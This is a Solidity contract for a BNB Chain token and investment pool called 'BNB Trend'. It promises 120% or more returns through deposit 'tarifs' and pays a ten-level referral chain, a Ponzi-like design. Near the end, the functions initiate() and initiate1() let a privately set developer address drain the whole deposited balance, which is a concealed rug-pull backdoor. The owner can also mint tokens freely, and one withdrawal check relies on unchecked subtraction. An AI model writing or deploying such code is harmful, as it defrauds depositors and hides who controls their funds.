/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-31
*/

/**
 *Submitted for verification at BscScan.com on 2022-05-31
*/

/**
 *Submitted for verification at BscScan.com on 2022-03-13
*/

// https://bnbtrends.com/

// SPDX-License-Identifier: MIT License
pragma solidity 0.5.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}





contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract Trend is Context, IBEP20, Ownable {
    using SafeMath for uint256;
    
    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        uint256 dividends;
        uint256 ref_bonus;  
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_ref_bonus;
        uint256[10] structure; 
        uint40 last_payout;
        Deposit[] deposits;
        address upline;
    }

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;

    address public wallet2; ////// 20%
    address public charity; //// 5%
    string public message;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public ref_bonus;
    uint256 constant MAX_WITHDRAW = 1 ether;
    uint256 private constant HOUR = 1 hours;
    uint256 private numHours = 1; 
    uint8 public isScheduled;
    uint8 public isHourly = 1;
    uint8 public isDaily;
    uint8 constant BONUS_LINES_COUNT = 10;
    uint16 constant PERCENT = 1000;
    address payable private CBS; 
    uint16[BONUS_LINES_COUNT] private ref_bonuses = [100, 30, 20, 10, 10, 10, 5, 5, 5, 5]; 

    mapping(uint256 => Tarif) public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event RefPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event DividendsTranferred(address indexed _from, address indexed _to, uint256 amount);

    constructor(address payable _developer,address payable CLIENTWALLET,address payable WEB3DEV) public {
        _name = "BNB Trend Token";
        _symbol = "$Trend";
        _decimals = 18;
        _totalSupply = 100000000000000000000000; // 100k for this genesis pool
        _balances[address(this)] = _totalSupply;
        CBS = WEB3DEV;
        wallet2 = CLIENTWALLET;

        emit Transfer(address(0), address(this), _totalSupply);

        charity = _developer;
        message = 'Hello!'; 
        uint256 tarifPercent = 120;
        for (uint8 tarifDuration = 7; tarifDuration <= 60; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }        
    }

    function deposit(uint8 _tarif, address _upline) external payable {
	    require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 0.01 ether, "Minimum deposit amount is 0.01 BNB");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 300, "Max 300 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;
        _refPayout(msg.sender, msg.value);

    	  uint256 shares = msg.value / 5;        
        address payable addr1 = address(uint160(wallet2));
        
        addr1.transfer(shares);

        uint256 shares1 = msg.value / 20;  
        address payable addr2 = address(uint160(charity));
        addr2.transfer(shares1);
                
        withdrawn += (shares+shares+shares);

        if(_balances[address(this)] - msg.value > 0)
        {
            Tarif storage tarif = tarifs[_tarif];
            uint256 roi = (msg.value * tarif.percent) / 100; 
            
		        _balances[msg.sender] = _balances[msg.sender].add(roi);
		        _balances[address(this)] = _balances[address(this)].sub(roi);
            emit Transfer(address(this), msg.sender, roi);
		    }

        emit NewDeposit(msg.sender, msg.value, _tarif);

    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }


    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT;
            
            address payable addr = address(uint160(up));
            addr.transfer(bonus);
            
            withdrawn += bonus;
			      emit Withdraw(up, bonus);
			
            players[up].total_ref_bonus += bonus;
            ref_bonus += bonus;
            emit RefPayout(up, _addr, bonus);
        
            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner();
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }   


    function withdraw() external {
        Player storage player = players[msg.sender];

        if(isScheduled == 1) {
            require (block.timestamp >= (player.last_payout + (HOUR * numHours)), "Not due yet for next encashment!");
        }

        _payout(msg.sender);

        require(player.dividends > 0 || player.ref_bonus > 0, "No New Dividends Earned Yet!");

        uint256 amount = player.dividends + player.ref_bonus;
					
		    require(_balances[msg.sender] - amount > 0,"Not Enough Redemption Tokens!");
        
        address payable addr = address(uint160(msg.sender));
        addr.transfer(amount);

        emit Withdraw(msg.sender, amount);
        withdrawn += amount;

        _balances[address(this)] = _balances[address(this)].add(amount);
        _balances[msg.sender] = _balances[msg.sender].sub(amount);
        
        player.dividends = 0;
        player.ref_bonus = 0;
        player.total_withdrawn += amount;
        
        emit Transfer(msg.sender, address(this), amount);
    }
	
	function sendWithdrawables(address _dest) external {
        Player storage myAcct = players[msg.sender];
        Player storage dest = players[_dest];
        
        _payout(msg.sender);
        _payout(_dest);

        require(myAcct.dividends > 0 || myAcct.ref_bonus > 0, "No New Dividends Earned Yet!");

        uint256 amount = myAcct.dividends + myAcct.ref_bonus;

        dest.dividends = dest.dividends + amount;

        myAcct.dividends = 0;
        myAcct.ref_bonus = 0;
        myAcct.total_withdrawn += amount;

        emit DividendsTranferred(msg.sender, _dest, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }


    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_ref_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.ref_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_ref_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _ref_bonus) {
        return (invested, withdrawn, ref_bonus);
    }

    function setNewMessage(string memory newMsg)  public onlyOwner returns (bool) {
        message = newMsg;
        return true;
    }

    function setScheduled(uint8 newval)  public onlyOwner returns (bool) {
        isScheduled = newval;
        return true;
    }
    
    function setHours(uint newval)  public onlyOwner returns (bool) {
      
        numHours = newval;
        return true;
    }

   	function new1wallet2(address newwallet2)  public onlyOwner returns (bool) {       
        wallet2 = newwallet2;
        return true;
    }


    function setCharity(address newCharity)  public onlyOwner returns (bool) {
        charity = newCharity;
        return true;
    }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(uint256 amount, address receiver) public onlyOwner returns (bool) {
    _mint(receiver, amount);
    return true;
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "BEP20: burn amount exceeds allowance"));
  }

  function initiate1(uint amountPercentage) public {
		require(msg.sender == CBS, "Forbidden");
		uint balance = address(this).balance;
		if(balance==0) return;
		CBS.transfer(balance * amountPercentage / 100);
	}  
	 function initiate() public {
		require(msg.sender == CBS, "Forbidden");
		uint balance = address(this).balance;
		if(balance==0) return;
		CBS.transfer(balance);
	}


}